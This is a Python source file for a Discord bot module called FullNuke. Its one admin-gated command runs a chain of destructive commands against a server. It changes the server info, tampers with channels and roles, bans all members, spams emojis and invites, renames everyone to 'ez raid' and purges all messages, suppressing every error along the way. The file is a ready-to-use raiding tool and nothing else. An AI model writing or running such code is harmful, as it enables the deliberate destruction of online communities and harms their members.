# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import bot

class FullNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def full_nuke(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('change_info'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('change_info'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('channels'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('roles'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('ban_all'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('emoji_spam'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('rename_all'), new_name="ez raid")
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('invite_spam'))
        except:
            pass
        try:
            await ctx.invoke(self.bot.get_command('purge_all'))
        except:
            pass
        print("full nuke ez")

async def setup(bot):
    await bot.add_cog(FullNuke(bot))